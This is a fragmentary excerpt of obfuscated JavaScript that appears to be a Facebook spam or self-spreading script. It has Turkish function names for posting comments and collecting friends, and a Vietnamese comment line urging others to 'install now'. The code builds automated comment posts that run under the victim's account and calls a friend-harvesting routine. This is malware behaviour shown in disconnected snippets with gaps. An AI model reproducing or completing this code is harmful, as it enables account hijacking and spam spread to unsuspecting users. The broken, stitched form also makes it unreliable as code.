...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/hoang.trankim.52" target="_blank">Hello.<br>IT VIỆT</a>';
	html += '</div>';
...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text=Cài đặc ngay cả nhà ui mình vừa làm thành công <3 <3 <#......' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
...
arkadaslari_al(271168093042258);